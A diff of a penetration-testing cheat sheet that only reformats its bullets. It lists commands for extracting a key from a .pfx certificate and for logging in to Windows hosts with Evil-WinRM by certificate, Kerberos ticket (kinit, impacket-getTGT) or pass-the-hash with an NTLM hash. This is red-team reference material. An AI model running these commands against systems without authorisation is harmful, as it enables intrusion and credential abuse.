@@ -16,21 +16,21 @@
 
 #### 2) Certificate (.pfx file)
 
- - openssl pkcs12 -in USER_PFX_CERT.pfx -nocerts -out key.pem -nodes
+     openssl pkcs12 -in USER_PFX_CERT.pfx -nocerts -out key.pem -nodes
 
- - openssl pkcs12 -in USER_PFX_CERT.pfx -nokeys -out cert.pem
+       openssl pkcs12 -in USER_PFX_CERT.pfx -nokeys -out cert.pem
 
 ### After generating the private key from the .pfx file, we use Evil-WinRM to authenticate
 
- - evil-winrm -i TARGET_IP -c CERT.pem -k KEY.pem
+    evil-winrm -i TARGET_IP -c CERT.pem -k KEY.pem
 
 #### 3) Kerberos
 
- - kinit USERNAME@DOMAIN.LOCAL (Authenticate and retrieve a ticket on Windows)
+    kinit USERNAME@DOMAIN.LOCAL (Authenticate and retrieve a ticket on Windows)
+  
+    impacket-getTGT DOMAIN.LOCAL/USERNAME:PASSWORD (Request a TGT ticket on Linux)
 
- - impacket-getTGT DOMAIN.LOCAL/USERNAME:PASSWORD (Request a TGT ticket on Linux)
-
- - Configure /etc/krb5.conf file with the appropriate settings (Replace some of the placeholders for your use case)
+ Configure /etc/krb5.conf file with the appropriate settings (Replace some of the placeholders for your use case)
 
        [libdefaults]
         default_realm = DOMAIN.LOCAL
@@ -52,8 +52,8 @@
 
 ### 
 
- - evil-winrm -r DOMAIN.LOCAL -i DC.DOMAIN.LOCAL (Authenticate via kerberos)
+    evil-winrm -r DOMAIN.LOCAL -i DC.DOMAIN.LOCAL (Authenticate via kerberos)
 
 #### 4) NTLM Authentication (Pass-the-Hash)
 
- - evil-winrm -i TARGET_IP -u USER -H NTLM_HASH
+    evil-winrm -i TARGET_IP -u USER -H NTLM_HASH
